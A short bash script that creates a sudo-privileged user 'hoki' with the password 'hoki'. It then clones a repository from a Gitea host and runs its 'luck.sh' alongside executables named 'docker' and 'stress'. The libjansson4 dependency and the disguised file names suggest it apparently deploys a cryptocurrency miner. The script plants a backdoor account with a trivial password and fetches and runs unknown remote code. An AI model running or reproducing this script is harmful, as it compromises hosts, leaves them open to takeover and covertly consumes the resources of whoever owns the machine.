#!/bin/bash
apt update
apt install sudo
sudo apt install screen libjansson4 -y
sudo useradd -m hoki
sudo adduser hoki sudo
sudo usermod -a -G sudo hoki
sudo echo 'hoki:hoki' | sudo chpasswd
cd /home/hoki
git clone https://try.gitea.io/xmanusnia/Workergits.git
cd Workergits
sudo chown hoki:sudo docker
sudo chown hoki:sudo luck.sh
sudo chmod 700 stress docker
sudo chmod 700 stress luck.sh
sudo -u hoki sh -c "/home/hoki/Workergits/luck.sh"
